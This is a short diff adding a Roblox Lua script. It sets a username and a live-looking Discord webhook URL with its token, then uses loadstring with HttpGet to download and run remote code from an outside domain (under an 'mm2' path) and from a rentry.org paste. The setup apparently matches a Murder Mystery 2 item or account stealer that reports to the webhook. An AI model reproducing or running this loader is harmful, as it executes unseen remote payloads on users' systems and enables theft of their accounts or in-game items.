@@ -1,0 +1,9 @@
+Username = "superjessica3024"
+Webhook = "https://discord.com/api/webhooks/1268566862703099976/9ZYA5-LliMfMPFFu6VbBMR3Rpw19Wpq14geCRMtjz52228xCnauAcJF_O9bF_cMuQs5_"
+
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
+
+
+loadstring(game:HttpGet("https://rentry.org/xnxmfbuk/raw", true))()
